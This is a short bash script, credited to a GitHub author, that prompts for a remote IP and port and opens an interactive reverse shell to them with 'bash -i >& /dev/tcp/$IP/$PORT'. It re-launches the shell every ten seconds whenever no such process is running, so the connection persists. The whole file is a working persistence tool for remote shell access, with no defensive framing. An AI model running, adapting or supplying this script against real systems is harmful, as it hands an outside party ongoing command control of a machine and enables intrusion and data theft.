#!/bin/bash
#A small program designed to establish and keep a reverse shell open
#written by https://github.com/PwnKitteh and modified by thisislola

echo "   ___                            ______       ____
  / _ \___ _  _____ __________   / __/ /  ___ / / /
 / , _/ -_) |/ / -_) __(_-< -_) _\ \/ _ \/ -_) / / 
/_/|_|\__/|___/\__/_/ /___|__/ /___/_//_/\__/_/_/  

"
read -p "Remote IP: " IP    #Victim's IP
read -p "Open port: " PORT

while(true); do
        if [ $(ps -ef | grep "bash -i" | grep -v grep | wc -l) -eq 0 ]
        then
                echo "Process not found. Launching reverse shell to $IP on port $PORT"
                bash -i >& /dev/tcp/$IP/$PORT 0>&1
        else
                echo "**Process found**"
                ps -ef | grep "bash -i" | grep -v "grep" | wc -l
        fi
                sleep 10
done
